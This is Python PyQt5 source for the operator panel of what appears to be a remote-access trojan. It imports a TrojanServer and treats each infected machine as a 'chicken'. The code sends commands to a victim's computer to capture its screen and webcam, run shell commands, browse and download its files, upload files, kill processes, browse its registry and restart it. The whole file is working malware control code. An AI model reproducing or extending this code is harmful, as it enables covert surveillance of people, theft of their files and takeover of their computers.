import json
import os
import struct
import sys
from threading import Thread

from PIL.Image import frombytes
from PIL import ImageQt
from PyQt5 import QtWidgets
from PyQt5.QtCore import pyqtSignal, Qt, QSize
from PyQt5.QtGui import QPixmap, QPalette, QImage
from PyQt5.QtWidgets import QWidget, QApplication, QListWidgetItem, QHBoxLayout, QLabel, QFileDialog, QMessageBox
import pyaudio
import wave
from tqdm import tqdm

from Detail import Ui_Form
from server import TrojanServer, Chienken

from builtins import print

STD = print


class DetailMain(QWidget, Ui_Form):
    connectsignal = pyqtSignal()
    pic_signal = pyqtSignal(QPixmap)
    camera_signal = pyqtSignal(QPixmap)
    consoleSignal = pyqtSignal(str)
    listSignal = pyqtSignal(list)
    pwdSignal = pyqtSignal(str)
    fileSignal = pyqtSignal(bytes)
    threadSignal = pyqtSignal(dict)
    regsubdirSignal = pyqtSignal(dict)
    regkeyvalueSignal = pyqtSignal(dict)
    pathSignal = pyqtSignal(str) # 其实是注册表的subkey

    def __init__(self, trojanserver=None, ck=0):
        super().__init__()
        self.setupUi(self)
        self.trojanServer = trojanserver
        self.ck = ck
        self.chicken:Chienken = self.trojanServer.allChickens[ck]
        self.newname_input.setText(self.chicken.name)
        self.iplable.setText(self.chicken.ip)
        self.portlabel.setText(str(self.chicken.port))
        self.enableReiceive = False
        self.online_label.setText("在线"if self.chicken.online else "离线")
        self.recvThread = None
        self.socket = None
        self.flushtime.setText(str(5))
        self.screenwidth = 300
        self.bind()

    def bind(self):
        self.connect_button.clicked.connect(self.connectChicken)
        self.connectsignal.connect(self.connected)
        self.get_pic.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d pic"%self.ck))
        self.get_camera.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d camera"%self.ck))
        self.pic_signal.connect(self.displayPic)
        self.camera_signal.connect(self.displayCamera)
        self.console_input.returnPressed.connect(self.consoleDisplay)
        self.consoleSignal.connect(self.upConsole)
        self.listSignal.connect(self.displayList)
        self.listWidget.itemClicked.connect(self.enterDir)
        self.threadSignal.connect(self.displayThread)
        self.regsubdirSignal.connect(self.displayregsubdir)
        self.regkeyvalueSignal.connect(self.displayregkeyvalue)
        self.Reglist.itemClicked.connect(self.enterSubkey)
        self.KeyValuelist.itemClicked.connect(self.DetailedKey)
        self.pathSignal.connect(self.displayregpath)
        self.Threadlist.itemClicked.connect(self.deletethread)
        self.freshlistbutton.clicked.connect(lambda :self.trojanServer.cmdQ.put("msg %d ls"%self.ck))
        self.backbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd .." % self.ck))
        self.hombutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos cd c:/" % self.ck))
        self.pwdSignal.connect(lambda x:self.address.setText(x))
        self.startpic.clicked.connect(self.picWatch)
        self.remotewidth.valueChanged.connect(self.remoteWidthChange)
        self.localwidth.valueChanged.connect(self.localWidthChange)
        self.restartbutton.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d dos restart" % self.ck))
        self.rename_button.clicked.connect(self.rename)
        self.uploadbutton.clicked.connect(self.upload)
        self.fileSignal.connect(self.saveFile)
        self.startThreadctrl.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d thread" % self.ck))
        self.startRegctrl.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d reg" % self.ck))
        self.RegRoot.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d regroot" % self.ck))
        self.RegBack.clicked.connect(lambda: self.trojanServer.cmdQ.put("msg %d regback" % self.ck))

    def waitConnection(self):
        while True:
            self.socket, addr = self.trojanServer.tcpSocket.accept()
            if addr[0] == self.chicken.ip:
                self.connectsignal.emit()
                break

    def rename(self):
        self.trojanServer.cmdQ.put("rename %d %s" %(self.ck, self.newname_input.text()))

    def connected(self):
        self.enableReiceive = True
        self.recvThread = Thread(target=self.receive)
        self.recvThread.daemon = True
        self.recvThread.start()
        self.infostatus.setText("已连接")
        self.connect_button.setText("断开连接")
        self.connect_button.clicked.disconnect(self.connectChicken)
        self.connect_button.clicked.connect(self.disconnected)
        self.trojanServer.cmdQ.put("msg %d ls"%self.ck)

    def displayPic(self, qmp:QPixmap):
        # size = qmp.size()
        # width = qmp.width()  ##获取图片宽度
        # height = qmp.height()
        # #qmp.data
        # #print("position1")
        # if width / self.pic_label.width() >= height / self.pic_label.height(): ##比较图片宽度与label宽度之比和图片高度与label高度之比
        #     ratio = width / self.pic_label.width()
        # else:
        #     ratio = height / self.pic_label.height()
        # new_width = width / ratio  ##定义新图片的宽和高
        # new_height = height / ratio
        # print("position1")
        #qmp = qmp.scaled(new_width, new_height)
            #qmp = qmp.scaled(self.screenwidth, int(size.height()*( self.screenwidth / size.width())))
        # print("position2")
        self.pic_label.setPixmap(qmp)

    def displayCamera(self, qmp:QPixmap):
        # print("position3")
        self.camera_label.setPixmap(qmp)

    def localWidthChange(self):
        self.screenwidth = self.localwidth.value()

    def remoteWidthChange(self):
        self.trojanServer.cmdQ.put("msg %d set picwidth %d" % (self.ck, self.remotewidth.value()))

    def tcpPieceRecv(self,length, socket, size=1024):
        dsize = 0
        body = b''
        while dsize + size < length:
            piece = socket.recv(size)
            body += piece
            dsize += len(piece)
        body += self.socket.recv(length - dsize)
        return body

    def receive(self):
        while self.enableReiceive:
            try:
                len_struct = self.socket.recv(4)
                if len_struct:
                    lens = struct.unpack('i', len_struct)[0]
                    body = self.socket.recv(lens)
                    ty = body.decode('utf8')
                    if ty == "pic":
                        d = self.socket.recv(12)
                        data = struct.unpack('iii', d)
                        width, height, pic_len = data
                        picmessage = "width:"+str(width)+"height:"+str(height)+"pic_len:"+str(pic_len)
                        print(picmessage)
                        body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                        try:
                            im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
                            # print(type(im))
                            self.pic_signal.emit(ImageQt.toqpixmap(im))
                        except:
                            STD("图片错误")
                    
                    elif ty == "camera_im":
                        d = self.socket.recv(12)
                        data = struct.unpack('iii', d)
                        width, height, pic_len = data
                        picmessage = "width:"+str(width)+"height:"+str(height)+"pic_len:"+str(pic_len)
                        print(picmessage)
                        body = self.tcpPieceRecv(pic_len, self.socket, 1024)
                        try:
                            im = frombytes(data=body, size=(width, height), mode="RGB", decoder_name='raw')
                            # print(type(im))
                            self.camera_signal.emit(ImageQt.toqpixmap(im))
                        except:
                            STD("图片错误")

                    elif ty == "response":
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.socket.recv(res_len)
                        self.consoleSignal.emit(response.decode("utf8"))
                    elif ty == "filelist":
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
                        data = json.loads(response.decode('utf8'))
                        data['list'] = data['list'][:300]
                        self.listSignal.emit(data['list'])
                        self.pwdSignal.emit(data['pwd'])
                    elif ty == "threadlist":
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
                        data = json.loads(response.decode('utf8'))
                        print("receive thread list")
                        print(type(data))
                        self.threadSignal.emit(data)
                        #????self.threadSignal.emit()#

                    # elif ty == 'regstart':
                    #     res_len = struct.unpack('i', self.socket.recv(4))[0]
                    #     response = self.tcpPieceRecv(res_len, self.socket, 1024)
                    #     data = json.loads(response.decode('utf8'))
                    #     self.regstartSignal.emit()

                    elif ty == 'reglist':
                        res_len = struct.unpack('i', self.socket.recv(4))[0]
                        response = self.tcpPieceRecv(res_len, self.socket, 1024)
                        data = json.loads(response.decode('utf8'))
                        print("receive reg list")
                        self.regsubdirSignal.emit(data['data_reg_subdir'])
                        self.regkeyvalueSignal.emit(data['data_reg_keyvalue'])
                        self.pathSignal.emit(data['data_path'])
                    
                    elif ty == 'file':
                        size = struct.unpack('i', self.socket.recv(4))[0]
                        data = self.tcpPieceRecv(size, self.socket, 1024)
                        self.fileSignal.emit(data)
            except:
                pass
        print("线程退出成功")


    def disconnected(self):
        self.enableReiceive = False
        if self.socket:
            self.socket.close()
        self.infostatus.setText("未连接")
        self.connect_button.setText("连接")
        self.connect_button.clicked.disconnect(self.disconnected)
        self.connect_button.clicked.connect(self.connectChicken)

    def tcpPieceSend(self,data, socket, size=1024):
        dsize = 0
        data_len = len(data)
        while dsize + size <= data_len:
            socket.send(data[dsize: dsize + size])
            dsize += size
        if dsize < data_len:
            socket.send(data[dsize:])

    def connectChicken(self):
        self.infostatus.setText("正在等待建立连接...")
        thread = Thread(target=self.waitConnection)
        thread.daemon = True
        thread.start()
        self.trojanServer.cmdQ.put("msg %d connect" % self.ck)

    def upConsole(self, content):
        self.console.append(content)
        self.console.moveCursor(self.console.textCursor().End)

    def upload(self):
        filename, fileType = QtWidgets.QFileDialog.getOpenFileName(self, "选取文件", os.getcwd(),
                                                                   "All Files(*);")
        print(filename)
        single_name = os.path.basename(filename)
        length = os.path.getsize(filename)
        cmd = "msg %d upload %s %d" % (self.ck, single_name, length)
        self.console.append("$: %s" % cmd)
        self.trojanServer.cmdQ.put(cmd)
        with open(filename, 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                self.tcpPieceSend(data, self.socket, 1024)

    def consoleDisplay(self):
        cmd = self.console_input.text()
        self.console_input.clear()
        if cmd == "cls" or cmd == 'clear':
            self.console.clear()
            return
        elif cmd == "restart":
            self.disconnected()
        elif cmd == "upload":
            self.upload()
        else:
            cmd = "msg %d dos %s" % (self.ck, cmd)
            self.console.append("$: %s" % cmd)
            self.trojanServer.cmdQ.put(cmd)

    def closeEvent(self, event):
        self.startpic.setText("开启屏幕监控")
        self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)
        self.trojanServer.cmdQ.put("msg %d disconnect" % self.ck)
        self.disconnected()

    def displayThread(self, flist):
        print("into display Thread")
        self.Threadlist.clear()
        def getThreadWin(ProcessName, Pid,  Parent, PPid):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)
            ProcessLabel = QLabel()
            ProcessLabel.setFixedSize(700, 20)
            ProcessLabel.setText(ProcessName)
            PidLabel = QLabel()
            PidLabel.setFixedSize(60, 20)
            PidLabel.setText(str(Pid))
            # RunningLabel = QLabel()
            # RunningLabel.setFixedSize(40, 20)
            # RunningLabel.setText(str(Running))
            ParentLabel = QLabel()
            ParentLabel.setFixedSize(700, 20)
            ParentLabel.setText(Parent)
            PPidLabel = QLabel()
            PPidLabel.setFixedSize(60, 20)
            PPidLabel.setText(str(PPid))

            widget.ProcessLabel = ProcessLabel
            widget.PidLabel = PidLabel
            # widget.RunningLabel = RunningLabel
            widget.ParentLabel = ParentLabel
            widget.PPidLabel = PPidLabel

            layout_main.addWidget(ProcessLabel)
            layout_main.addWidget(PidLabel)
            # layout_main.addWidget(RunningLabel)
            layout_main.addWidget(ParentLabel)
            layout_main.addWidget(PPidLabel)
            return widget
        item = QListWidgetItem()
        item.setSizeHint(QSize(800, 40))
        self.Threadlist.addItem(item)
        widget = QWidget()
        layout_main = QHBoxLayout()
        widget.setLayout(layout_main)
        Name = QLabel()
        Name.setFixedSize(700, 20)
        Name.setText("Process Name")
        pe = QPalette()
        pe.setColor(QPalette.WindowText,Qt.red)
        self.label.setAutoFillBackground(True)
        pe.setColor(QPalette.Window,Qt.blue)
        Name.setPalette(pe)
        Pid_2 = QLabel()
        Pid_2.setFixedSize(60, 20)
        Pid_2.setText("Pid")
        Pid_2.setPalette(pe)
        ParentName = QLabel()
        ParentName.setFixedSize(700, 20)
        ParentName.setText("Parent Name")
        ParentName.setPalette(pe)
        PPid_ = QLabel()
        PPid_.setFixedSize(60, 20)
        PPid_.setText("PPid")
        PPid_.setPalette(pe)
        widget.Name = Name
        widget.Pid_2 = Pid_2
        # widget.RunningLabel = RunningLabel
        widget.ParentName = ParentName
        widget.PPid_ = PPid_

        layout_main.addWidget(Name)
        layout_main.addWidget(Pid_2)
        # layout_main.addWidget(RunningLabel)
        layout_main.addWidget(ParentName)
        layout_main.addWidget(PPid_)
        self.Threadlist.setItemWidget(item, widget)
        for f in flist.values():
            item = QListWidgetItem()
            item.setSizeHint(QSize(800, 40))
            self.Threadlist.addItem(item)
            widget = getThreadWin(f['Process name:'], f['PID:'],f['Parent:'],f['Parent pid:'])
            self.Threadlist.setItemWidget(item, widget)

    def displayregsubdir(self, flist):
        self.Reglist.clear()
        def getRegSubdirWin(name):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)
            icon = QLabel()
            icon.setFixedSize(20, 20)
            icon.setPixmap(QPixmap('pic/dir_icon.png').scaled(20, 20))

            namelabel = QLabel()
            namelabel.setText(name)

            widget.namelabel = namelabel

            layout_main.addWidget(icon)
            layout_main.addWidget(namelabel)
            return widget

        for f in flist.values():
            item = QListWidgetItem()
            item.setSizeHint(QSize(150, 40))
            self.Reglist.addItem(item)
            widget = getRegSubdirWin(f)
            self.Reglist.setItemWidget(item, widget)

    def displayregkeyvalue(self, flist):
        self.KeyValuelist.clear()

        def getKeyValueWin(name, value, typeNo):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)
            NameLabel = QLabel()
            NameLabel.setFixedSize(700, 20)
            NameLabel.setText(name)
            ValueLabel = QLabel()
            ValueLabel.setFixedSize(60, 20)
            ValueLabel.setText(str(value))
            typeNoLabel = QLabel()
            typeNoLabel.setFixedSize(700, 20)
            typeNoLabel.setText(str(typeNo))

            widget.NameLabel = NameLabel
            widget.ValueLabel = ValueLabel
            widget.typeNoLabel = typeNoLabel

            layout_main.addWidget(NameLabel)
            layout_main.addWidget(ValueLabel)
            layout_main.addWidget(typeNoLabel)
            return widget

        item = QListWidgetItem()
        item.setSizeHint(QSize(800, 40))
        self.KeyValuelist.addItem(item)
        widget = QWidget()
        layout_main = QHBoxLayout()
        widget.setLayout(layout_main)
        Name = QLabel()
        Name.setFixedSize(700, 20)
        Name.setText("Key Name")
        pe = QPalette()
        pe.setColor(QPalette.WindowText,Qt.red)
        self.label.setAutoFillBackground(True)
        pe.setColor(QPalette.Window,Qt.blue)
        Name.setPalette(pe)
        Value = QLabel()
        Value.setFixedSize(60, 20)
        Value.setText("Value")
        Value.setPalette(pe)
        TypeNo = QLabel()
        TypeNo.setFixedSize(700, 20)
        TypeNo.setText("TypeNo")
        TypeNo.setPalette(pe)
        widget.Name = Name
        widget.Value = Value
        widget.TypeNo = TypeNo

        layout_main.addWidget(Name)
        layout_main.addWidget(Value)
        layout_main.addWidget(TypeNo)
        self.KeyValuelist.setItemWidget(item, widget)
        for f in flist.values():
            item = QListWidgetItem()
            item.setSizeHint(QSize(800, 40))
            self.KeyValuelist.addItem(item)
            widget = getKeyValueWin(f['name'], f['value'],f['typeNo'])
            self.KeyValuelist.setItemWidget(item, widget)

    def displayregpath(self, flist):
        self.Regpath.clear()
        def getRegPathWin(path):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)

            pathlabel = QLabel()
            pathlabel.setText(path)

            widget.pathlabel = pathlabel

            layout_main.addWidget(pathlabel)
            return widget

        item = QListWidgetItem()
        # item.setSizeHint(QSize(130, 30))
        # item.setSizeHint(QSize(100, 30))
        item.setSizeHint(QSize(150, 40))
        # item.setSizeHint(QSize(20, 20))
        self.Regpath.addItem(item)
        widget = getRegPathWin(flist)
        self.Regpath.setItemWidget(item, widget)

    def enterSubkey(self, item:QListWidgetItem = None):
        widget = self.Reglist.itemWidget(item)
        name = widget.namelabel.text()
        self.trojanServer.cmdQ.put("msg %d regSubkey %s" %(self.ck, name))

        # widget = self.listWidget.itemWidget(item)
        # name = widget.namelabel.text()
        # if widget.isDir:
        #     self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
        # else:
        #     reply = QMessageBox.question(self, '提示', '下载%s?'%name,
        #                                  QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

        #     if reply == QMessageBox.Yes:
        #         self.trojanServer.cmdQ.put("msg %d getFile %s"%(self.ck, name))
        #     else:
        #         pass

    def DetailedKey(self):
        pass
    

    def displayList(self, flist):
        self.listWidget.clear()
        def getWidget(name, isDir):
            widget = QWidget()
            layout_main = QHBoxLayout()
            widget.setLayout(layout_main)
            icon = QLabel()
            icon.setFixedSize(20, 20)
            icon.setPixmap(QPixmap('pic/dir_icon.png'if isDir else 'pic/file_icon.png').scaled(20, 20))

            namelabel = QLabel()
            namelabel.setText(name)

            widget.namelabel = namelabel
            widget.isDir = isDir

            layout_main.addWidget(icon)
            layout_main.addWidget(namelabel)
            return widget

        for f in flist:
            item = QListWidgetItem()
            item.setSizeHint(QSize(150, 40))
            self.listWidget.addItem(item)
            widget = getWidget(f[0], f[1])
            self.listWidget.setItemWidget(item, widget)

    def saveFile(self, data):
        file_name, type = QFileDialog.getSaveFileName(self, 'save file', os.getcwd(), "ALL (*)")
        if file_name:
            with open(file_name, 'wb') as file:
                file.write(data)
                print("传输完成")


    def enterDir(self, item:QListWidgetItem = None):
        widget = self.listWidget.itemWidget(item)
        name = widget.namelabel.text()
        if widget.isDir:
            self.trojanServer.cmdQ.put("msg %d dos cd %s" %(self.ck, name))
        else:
            reply = QMessageBox.question(self, '提示', '下载%s?'%name,
                                         QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

            if reply == QMessageBox.Yes:
                self.trojanServer.cmdQ.put("msg %d getFile %s"%(self.ck, name))
            else:
                pass
    def deletethread(self, item:QListWidgetItem = None):
        widget = self.Threadlist.itemWidget(item)
        _pid = widget.PidLabel.text()
        reply = QMessageBox.question(self, '提示', '删除%s?'%_pid, QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.trojanServer.cmdQ.put("msg %d DeleteThread %s"%(self.ck, str(_pid)))
        else:
            pass

    def picWatch(self):
        status = self.startpic.text()
        if status == "开启屏幕监控":
            self.startpic.setText("关闭屏幕监控")
            limit = self.flushtime.text()
            self.trojanServer.cmdQ.put("msg %d set pictime %s" %(self.ck, limit))
            self.trojanServer.cmdQ.put("msg %d picstart" % self.ck)
        else:
            self.startpic.setText("开启屏幕监控")
            self.trojanServer.cmdQ.put("msg %d picstop" % self.ck)


if __name__ == '__main__':
    tro = TrojanServer()
    app = QApplication(sys.argv)
    detail = DetailMain(tro, 0)
    detail.show()
    sys.exit(app.exec_())